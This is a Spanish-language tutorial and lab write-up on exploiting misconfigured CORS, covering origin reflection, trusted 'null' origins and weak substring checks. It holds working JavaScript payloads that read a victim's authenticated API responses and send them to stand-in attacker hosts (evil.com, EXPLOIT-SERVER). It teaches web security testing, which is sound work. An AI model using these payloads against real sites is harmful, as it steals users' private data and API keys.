# CORS (Cross-Origin Resource Sharing) mal configurado

**CORS** es el mecanismo que decide qué orígenes (dominios) pueden leer las respuestas de una API desde el navegador. Mal configurado, permite que **un sitio del atacante lea datos sensibles** de la víctima (incluidos datos tras autenticación), robando información o tokens.

---

## El concepto en 30 segundos

Por defecto, el navegador **bloquea** que `evil.com` lea la respuesta de `api.victima.com` (Same-Origin Policy). CORS **relaja** esa regla con cabeceras del servidor:

```http
Access-Control-Allow-Origin: https://confiable.com
Access-Control-Allow-Credentials: true
```

El problema aparece cuando el servidor **confía en orígenes que no debería**.

---

## Configuraciones vulnerables

### 1. Reflejar el Origin + credenciales

El servidor devuelve como permitido **el mismo Origin que envías**, y además permite credenciales:

```http
# Petición
Origin: https://evil.com
# Respuesta vulnerable
Access-Control-Allow-Origin: https://evil.com     ← refleja cualquiera
Access-Control-Allow-Credentials: true
```

Cualquier web puede leer la respuesta autenticada de la víctima. Explotación:

```html
<script>
fetch('https://api.victima.com/me', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('https://evil.com/log?d=' + encodeURIComponent(d)));
</script>
```

### 2. `Access-Control-Allow-Origin: null`

Algunos servidores confían en el origen `null`. Se obtiene desde un iframe sandboxed:

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
fetch('https://api.victima.com/me',{credentials:'include'})
  .then(r=>r.text()).then(d=>location='https://evil.com/?'+btoa(d));
</script>"></iframe>
```

### 3. Validación de subcadena débil

El servidor comprueba que el Origin "contenga" `victima.com`:

```text
Origin: https://victima.com.evil.com     ← pasa el filtro
Origin: https://evilvictima.com          ← pasa el filtro
```

> **Consejo:** `Access-Control-Allow-Origin: *` **sin** credenciales no suele ser explotable para robar datos privados (el navegador no envía cookies). El caso grave es **reflejar el Origin + `Allow-Credentials: true`**, o confiar en `null` o en validaciones por subcadena.

---

## Cómo probarlo

Envía una petición cambiando la cabecera `Origin` y mira la respuesta:

```bash
curl -s -I https://api.victima.com/me -H "Origin: https://evil.com" | grep -i access-control
```

Si ves `Access-Control-Allow-Origin: https://evil.com` junto a `Access-Control-Allow-Credentials: true`, es vulnerable. Prueba también `Origin: null` y variantes de subcadena.

---

## Impacto

Robo de datos personales y de respuestas autenticadas (perfil, tokens de API, claves CSRF). A menudo se encadena para toma de cuenta: si la respuesta incluye un token o permite leer el token anti-CSRF, ejecutas acciones en nombre de la víctima.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `curl` | Probar manualmente cabeceras `Origin` y respuestas CORS. |
| `Burp Suite` | La extensión *CORS* y pruebas manuales. |
| `corsy` | Escáner automático de configuraciones CORS inseguras. |

---

> **Consejo:** prueba siempre a inyectar `Origin: https://evil.com` en las peticiones a la API y mira si se refleja en `Access-Control-Allow-Origin` con `Allow-Credentials: true`. Ese combo convierte CORS en una fuga de datos autenticados de cualquier usuario que visite tu página.

---

## Dónde practicar el CORS

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — CORS | Labs gratis | https://portswigger.net/web-security/cors |
| corsy (escáner) | GitHub | https://github.com/s0md3v/Corsy |

## Writeup guiado: reflejo de Origin + credenciales (PortSwigger)

Lab: *"CORS vulnerability with basic origin reflection"*. Objetivo: robar la API key de la víctima.

```flow
Detectar :: El servidor refleja el Origin y permite credenciales.
Construir :: Un script que pide /accountDetails con las cookies de la víctima.
Exfiltrar :: Enviar la respuesta (la API key) a tu servidor.
Entregar :: La víctima visita la página y robas su clave.
```

### Paso 1 — Detectar

```bash
curl -s -I https://LAB-ID.web-security-academy.net/accountDetails \
  -H "Origin: https://evil.com" | grep -i access-control
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

Refleja tu Origin **y** permite credenciales → explotable.

### Paso 2 — Exploit (en el exploit server)

```html
<script>
fetch('https://LAB-ID.web-security-academy.net/accountDetails', { credentials: 'include' })
  .then(r => r.text())
  .then(d => fetch('https://EXPLOIT-SERVER/log?key=' + encodeURIComponent(d)));
</script>
```

### Paso 3 — Entregar y leer

*Deliver to victim*, y en *Access log* del exploit server aparece la respuesta con la **API key**. La envías → lab resuelto.

> **Consejo:** practica también el lab de **`Origin: null`** (se explota desde un iframe sandboxed) y el de confianza en subdominios. El patrón crítico siempre es **reflejo del Origin + `Allow-Credentials: true`**; sin credenciales, un `*` no suele ser explotable.
